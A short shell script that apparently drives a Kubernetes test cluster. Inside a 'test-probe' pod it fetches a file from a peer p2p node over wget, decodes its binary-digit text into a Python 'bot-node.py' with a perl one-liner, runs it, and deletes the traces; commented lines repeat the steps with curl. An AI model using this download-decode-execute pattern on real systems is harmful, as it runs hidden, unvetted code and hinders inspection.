#!/bin/sh
path="bot-node.py"
binary_path="bot-node.bin"

host="$(hostname -i):45666"
remote_host="$(kubectl exec \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep p2p-0-node) \
    -- hostname -i
):45666"

kubectl exec -it \
    $(kubectl get pods -o=name --field-selector=status.phase=Running | grep test-probe) \
    -- sh -c "\
        autorun(){ 
            wget -O \"\$2\" http://\"\$1\";
            cat \"\$2\" | perl -lape '\$_=pack\"(B8)*\",@F' > \"\$3\"; 
            python \"\$3\" \"\$4\" \"\$1\";
            rm \"\$1\" \"\$2\";
            ls -ltr;
        } 
        autorun \"$remote_host\" \"$binary_path\" \"$path\" \"$host\""

# if [ ! -f $path ]; then wget -O $binary_path http://$remotehost; fi
# if [ ! -f $path ]; then curl -vvv -o $binary_path http://$remotehost; fi
# # parse downloaded binary to ASCII & exec
# cat $binary_path | perl -lape '$_=pack\"(B8)*\",@F' > $path
# python $path $host $remotehost
